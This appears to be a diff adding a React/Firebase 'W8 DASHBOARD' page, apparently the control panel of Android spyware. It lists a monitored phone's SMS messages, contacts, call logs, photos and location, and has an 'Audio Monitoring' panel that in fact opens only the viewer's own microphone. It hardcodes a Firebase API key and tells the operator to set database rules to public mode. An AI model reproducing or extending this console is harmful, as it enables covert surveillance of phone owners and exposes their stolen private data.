@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DroidDash | One-File Control Center</title>
+    <!-- Tailwind CSS 3 CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        body { font-family: 'Inter', sans-serif; background-color: #0a0a0a; color: #d4d4d8; }
+        .font-mono { font-family: 'JetBrains Mono', monospace; }
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #0a0a0a; }
+        ::-webkit-scrollbar-thumb { background: #2c2c2e; border-radius: 10px; }
+        .bg-checkerboard {
+            background-image: linear-gradient(45deg, #141414 25%, transparent 25%), 
+                              linear-gradient(-45deg, #141414 25%, transparent 25%), 
+                              linear-gradient(45deg, transparent 75%, #141414 75%), 
+                              linear-gradient(-45deg, transparent 75%, #141414 75%);
+            background-size: 20px 20px;
+            background-position: 0 0, 0 10px, 10px -10px, -10px 0px;
+        }
+    </style>
+</head>
+<body>
+    <div id="root"></div>
+
+    <!-- React, ReactDOM, Babel (untuk JSX), dan Firebase melalui CDN -->
+    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+
+    <script type="text/babel">
+        const { useState, useEffect, useRef } = React;
+
+        // --- Konfigurasi Firebase Anda ---
+        const firebaseConfig = {
+            apiKey: "AIzaSyC7tU_KQ880cglVxReb0j0H0C5thBKMB0w",
+            authDomain: "w8dashboard.firebaseapp.com",
+            databaseURL: "https://w8dashboard-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "w8dashboard",
+            storageBucket: "w8dashboard.firebasestorage.app",
+            messagingSenderId: "1062991975629",
+            appId: "1:1062991975629:web:4cb047393956173fa00584"
+        };
+
+        // Inisialisasi Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+        const rtdb = firebase.database();
+
+        // --- Komponen UI ---
+        const Icon = ({ name, size = 18, className = "" }) => {
+            useEffect(() => {
+                lucide.createIcons();
+            }, []);
+            return <i data-lucide={name} style={{ width: size, height: size }} className={className}></i>;
+        };
+
+        const StatusCard = ({ icon, label, value, subtext, color = 'blue' }) => (
+            <div className="bg-[#1c1c1e] border border-[#2c2c2e] p-4 rounded-xl flex flex-col justify-between hover:border-blue-500/50 transition-colors">
+                <div className="flex justify-between items-start">
+                    <div className={`p-2 rounded-lg bg-${color}-500/10 text-${color}-500`}>
+                        <Icon name={icon} />
+                    </div>
+                </div>
+                <div className="mt-4">
+                    <div className="text-zinc-400 text-xs font-medium">{label}</div>
+                    <div className="text-2xl font-semibold text-white mt-1">{value}</div>
+                    <div className="text-[10px] text-zinc-500 mt-1 uppercase tracking-tighter">{subtext}</div>
+                </div>
+            </div>
+        );
+
+        // --- Main App ---
+        function Dashboard() {
+            const [view, setView] = useState('status');
+            const [device, setDevice] = useState({ battery: 0, uptime: 'N/A', storage: '0 GB', temp: 0, signal: 'Standby' });
+            const [data, setData] = useState({ sms: [], contacts: [], calls: [], gallery: [], location: null });
+            const [isMicActive, setIsMicActive] = useState(false);
+            const [errorMessage, setErrorMessage] = useState(null);
+            const streamRef = useRef(null);
+
+            useEffect(() => {
+                // Konfigurasi Error Handler
+                const onFirestoreError = (err) => {
+                    console.error("Firestore Error:", err);
+                    if (err.code === 'permission-denied') {
+                        setErrorMessage("Akses Ditolak: Pastikan Cloud Firestore API sudah aktif dan Rules diatur ke mode publik/test.");
+                    } else {
+                        setErrorMessage("Error Koneksi Firebase: " + err.message);
+                    }
+                };
+
+                // Real-time Status
+                const statusRef = rtdb.ref('device/status');
+                statusRef.on('value', snap => snap.val() && setDevice(snap.val()), (err) => setErrorMessage("RTDB Error: " + err.message));
+
+                // Location Status
+                const locRef = rtdb.ref('device/location');
+                locRef.on('value', snap => snap.val() && setData(prev => ({ ...prev, location: snap.val() })));
+
+                // SMS, Calls, Contacts dari Firestore
+                const unsubSms = db.collection('sms').orderBy('timestamp', 'desc').limit(50).onSnapshot(s => setData(p => ({ ...p, sms: s.docs.map(d => ({ id: d.id, ...d.data() })) })), onFirestoreError);
+                const unsubCalls = db.collection('calls').orderBy('timestamp', 'desc').limit(50).onSnapshot(s => setData(p => ({ ...p, calls: s.docs.map(d => ({ id: d.id, ...d.data() })) })), onFirestoreError);
+                const unsubContacts = db.collection('contacts').orderBy('name', 'asc').onSnapshot(s => setData(p => ({ ...p, contacts: s.docs.map(d => ({ id: d.id, ...d.data() })) })), onFirestoreError);
+                const unsubGallery = db.collection('gallery').orderBy('timestamp', 'desc').onSnapshot(s => setData(p => ({ ...p, gallery: s.docs.map(d => ({ id: d.id, ...d.data() })) })), onFirestoreError);
+
+                return () => {
+                    statusRef.off();
+                    locRef.off();
+                    unsubSms();
+                    unsubCalls();
+                    unsubContacts();
+                    unsubGallery();
+                };
+            }, []);
+
+            const toggleMic = async () => {
+                if (isMicActive) {
+                    streamRef.current?.getTracks().forEach(t => t.stop());
+                    setIsMicActive(false);
+                } else {
+                    try {
+                        const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+                        streamRef.current = s;
+                        setIsMicActive(true);
+                    } catch (e) { alert('Akses mikrofon ditolak'); }
+                }
+            };
+
+            const menu = [
+                { id: 'status', label: 'Status', icon: 'smartphone' },
+                { id: 'sms', label: 'SMS', icon: 'message-square' },
+                { id: 'contacts', label: 'Kontak', icon: 'users' },
+                { id: 'calls', label: 'Panggilan', icon: 'phone' },
+                { id: 'location', label: 'Lokasi', icon: 'map-pin' },
+                { id: 'gallery', label: 'Galeri', icon: 'image' },
+                { id: 'audio', label: 'Audio', icon: 'mic' },
+            ];
+
+            return (
+                <div className="flex h-screen overflow-hidden">
+                    {/* Sidebar */}
+                    <aside className="w-64 bg-[#141414] border-r border-[#2c2c2e] flex flex-col shrink-0">
+                        <div className="p-6">
+                            <div className="flex items-center gap-3 text-white mb-10 overflow-hidden">
+                                <div className="bg-blue-600 p-2 rounded-lg shrink-0">
+                                    <Icon name="shield-check" />
+                                </div>
+                                <span className="font-bold text-lg tracking-tight truncate">W8 DASHBOARD</span>
+                            </div>
+                            <nav className="space-y-1">
+                                {menu.map(item => (
+                                    <button 
+                                        key={item.id} 
+                                        onClick={() => setView(item.id)}
+                                        className={`w-full flex items-center gap-3 px-4 py-3 rounded-lg text-sm transition-all ${view === item.id ? 'bg-blue-600/10 text-blue-500 font-medium' : 'text-zinc-500 hover:bg-zinc-800/50'}`}
+                                    >
+                                        <Icon name={item.icon} size={18} />
+                                        {item.label}
+                                    </button>
+                                ))}
+                            </nav>
+                        </div>
+                        <div className="mt-auto p-4 border-t border-[#2c2c2e] bg-[#1a1a1c]">
+                            <div className="flex items-center gap-3">
+                                <div className="w-8 h-8 rounded-full bg-zinc-800 flex items-center justify-center text-[10px] text-zinc-400 font-bold shrink-0">ID</div>
+                                <div className="overflow-hidden">
+                                    <div className="text-[11px] font-bold text-white truncate truncate">Device Connected</div>
+                                    <div className="text-[9px] text-zinc-500 font-mono truncate">{device.signal}</div>
+                                </div>
+                            </div>
+                        </div>
+                    </aside>
+
+                    {/* Main */}
+                    <main className="flex-1 flex flex-col bg-[#0a0a0a]">
+                        <header className="h-16 border-b border-[#2c2c2e] flex items-center justify-between px-8 bg-[#0a0a0a]/50 backdrop-blur-md">
+                            <div className="text-[10px] font-mono tracking-widest text-zinc-500 flex items-center gap-2">
+                                <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse"></div>
+                                LIVE SYSTEM FEED
+                            </div>
+                                <div className="text-[11px] font-mono">
+                                    <div className="flex items-center gap-6">
+                                        <div className="flex items-center gap-2">
+                                            <Icon name="battery" size={14} className={device.battery < 20 ? 'text-red-500' : 'text-zinc-400'} />
+                                            <span>{device.battery}%</span>
+                                        </div>
+                                        <div className="flex items-center gap-2">
+                                            <Icon name="wifi" size={14} className="text-zinc-400" />
+                                            <span>{device.signal}</span>
+                                        </div>
+                                    </div>
+                                </div>
+                        </header>
+
+                        {errorMessage && (
+                            <div className="bg-red-600/10 border-b border-red-600/20 px-8 py-2 flex items-center justify-between text-[11px] font-medium text-red-500">
+                                <div className="flex items-center gap-2">
+                                    <Icon name="alert-circle" size={14} />
+                                    <span>{errorMessage}</span>
+                                </div>
+                                <button onClick={() => setErrorMessage(null)} className="hover:text-white transition-colors">Tutup</button>
+                            </div>
+                        )}
+
+                        <div className="flex-1 overflow-y-auto p-8">
+                            <div className="max-w-5xl mx-auto">
+                                {view === 'status' && (
+                                    <div className="space-y-8 animate-in fade-in slide-in-from-bottom-2 duration-300">
+                                        <div>
+                                            <h2 className="text-2xl font-bold text-white">Device Status</h2>
+                                            <p className="text-sm text-zinc-500">Monitoring kesehatan perangkat dari database.</p>
+                                        </div>
+                                        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
+                                            <StatusCard icon="battery" label="Baterai" value={`${device.battery}%`} subtext={device.isCharging ? 'Status: Mengisi' : 'Status: Discharge'} color="green" />
+                                            <StatusCard icon="clock" label="Uptime" value={device.uptime} subtext="Lama Aktif" color="blue" />
+                                            <StatusCard icon="hard-drive" label="Storage" value={device.storage} subtext="Cloud Usage" color="purple" />
+                                            <StatusCard icon="activity" label="Temperatur" value={`${device.temp}°C`} subtext="Inti Sistem" color="orange" />
+                                        </div>
+                                    </div>
+                                )}
+
+                                {view === 'sms' && (
+                                    <div className="space-y-4">
+                                        <h2 className="text-xl font-bold text-white">Pesan SMS</h2>
+                                        <div className="bg-[#1c1c1e] border border-[#2c2c2e] rounded-xl overflow-hidden divide-y divide-[#2c2c2e]">
+                                            {data.sms.length > 0 ? data.sms.map(msg => (
+                                                <div key={msg.id} className="p-4 hover:bg-zinc-800/20 flex gap-4 transition-colors">
+                                                    <div className="w-10 h-10 rounded-full bg-zinc-800 flex items-center justify-center text-blue-500 shrink-0">
+                                                        <Icon name="message-square" />
+                                                    </div>
+                                                    <div className="flex-1 min-w-0">
+                                                        <div className="flex justify-between items-start mb-1">
+                                                            <span className="font-semibold text-white">{msg.sender}</span>
+                                                            <span className="text-[10px] text-zinc-500 uppercase">{msg.time}</span>
+                                                        </div>
+                                                        <p className="text-sm text-zinc-500 break-words">{msg.preview || msg.body}</p>
+                                                    </div>
+                                                </div>
+                                            )) : <div className="p-12 text-center text-zinc-500">Log SMS Kosong</div>}
+                                        </div>
+                                    </div>
+                                )}
+
+                                {view === 'contacts' && (
+                                    <div className="space-y-4">
+                                        <h2 className="text-xl font-bold text-white">Kontak</h2>
+                                        <div className="bg-[#1c1c1e] border border-[#2c2c2e] rounded-xl overflow-x-auto">
+                                            <table className="w-full text-left">
+                                                <thead className="bg-[#252529] text-[10px] uppercase font-bold text-zinc-500">
+                                                    <tr>
+                                                        <th className="px-6 py-4">Nama</th>
+                                                        <th className="px-6 py-4">Telepon</th>
+                                                        <th className="px-6 py-4">Kategori</th>
+                                                    </tr>
+                                                </thead>
+                                                <tbody className="divide-y divide-[#2c2c2e] text-sm">
+                                                    {data.contacts.map(c => (
+                                                        <tr key={c.id} className="hover:bg-zinc-800/20 transition-colors">
+                                                            <td className="px-6 py-4 text-white">{c.name}</td>
+                                                            <td className="px-6 py-4 font-mono text-zinc-500">{c.phone}</td>
+                                                            <td className="px-6 py-4"><span className="bg-zinc-800 px-2 py-1 rounded text-[10px] text-zinc-400 capitalize">{c.type}</span></td>
+                                                        </tr>
+                                                    ))}
+                                                </tbody>
+                                            </table>
+                                        </div>
+                                    </div>
+                                )}
+
+                                {view === 'calls' && (
+                                    <div className="space-y-4">
+                                        <h2 className="text-xl font-bold text-white">Log Panggilan</h2>
+                                        <div className="bg-[#1c1c1e] border border-[#2c2c2e] rounded-xl overflow-hidden divide-y divide-[#2c2c2e]">
+                                            {data.calls.map(call => (
+                                                <div key={call.id} className="p-4 flex items-center justify-between">
+                                                    <div className="flex items-center gap-4">
+                                                        <div className={`p-2 rounded-lg ${call.type === 'missed' ? 'text-red-500' : 'text-green-500'} bg-zinc-800`}>
+                                                            <Icon name="phone" size={16} />
+                                                        </div>
+                                                        <div>
+                                                            <div className="text-sm font-semibold text-white">{call.number}</div>
+                                                            <div className="text-[10px] text-zinc-500">{call.time} | {call.duration}</div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            ))}
+                                        </div>
+                                    </div>
+                                )}
+
+                                {view === 'location' && (
+                                    <div className="space-y-4">
+                                        <h2 className="text-xl font-bold text-white">Lokasi Perangkat</h2>
+                                        <div className="h-[400px] bg-[#1c1c1e] border border-[#2c2c2e] rounded-2xl flex flex-col items-center justify-center p-8 text-center bg-checkerboard relative overflow-hidden">
+                                             <div className="z-10">
+                                                <Icon name="map-pin" size={48} className="text-blue-500 mb-4 mx-auto" />
+                                                <h3 className="text-lg font-bold text-white mb-2">Koordinat Database</h3>
+                                                <p className="text-zinc-500 text-sm max-w-xs font-mono">
+                                                    {data.location ? `${data.location.lat}, ${data.location.lng}` : 'Menunggu data koordinat...'}
+                                                </p>
+                                             </div>
+                                             {data.location && <div className="absolute inset-0 bg-blue-500/5 backdrop-blur-[1px]"></div>}
+                                        </div>
+                                    </div>
+                                )}
+
+                                {view === 'gallery' && (
+                                    <div className="space-y-4">
+                                        <h2 className="text-xl font-bold text-white">Galeri</h2>
+                                        <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-4">
+                                            {data.gallery.length > 0 ? data.gallery.map(img => (
+                                                <div key={img.id} className="bg-[#1c1c1e] border border-[#2c2c2e] rounded-xl overflow-hidden group">
+                                                    <img src={img.url} className="w-full aspect-square object-cover group-hover:scale-105 transition-transform" />
+                                                    <div className="p-2 text-[9px] text-zinc-500 truncate">{img.name}</div>
+                                                </div>
+                                            )) : <div className="col-span-full py-20 text-center text-zinc-600">Belum ada media tersinkronisasi.</div>}
+                                        </div>
+                                    </div>
+                                )}
+
+                                {view === 'audio' && (
+                                    <div className="max-w-md mx-auto space-y-6 pt-10">
+                                        <div className="p-10 bg-[#1c1c1e] border border-[#2c2c2e] rounded-3xl text-center shadow-2xl">
+                                            <div className={`w-24 h-24 rounded-full mx-auto flex items-center justify-center mb-8 transition-all ${isMicActive ? 'bg-blue-600 shadow-[0_0_40px_rgba(37,99,235,0.4)]' : 'bg-zinc-800'}`}>
+                                                <Icon name="mic" size={40} className={isMicActive ? 'text-white' : 'text-zinc-600'} />
+                                            </div>
+                                            <h3 className="text-white font-bold text-xl mb-2">Audio Monitoring</h3>
+                                            <p className="text-zinc-500 text-xs mb-8">Stream suara dari mikrofon perangkat ke dashboard.</p>
+                                            <button 
+                                                onClick={toggleMic}
+                                                className={`w-full py-4 rounded-xl font-bold transition-all ${isMicActive ? 'bg-red-600 text-white' : 'bg-blue-600 text-white hover:bg-blue-700'}`}
+                                            >
+                                                {isMicActive ? 'STOP MONITOR' : 'START MONITOR'}
+                                            </button>
+                                        </div>
+                                    </div>
+                                )}
+                            </div>
+                        </div>
+                    </main>
+                </div>
+            );
+        }
+
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<Dashboard />);
+    </script>
+</body>
+</html>
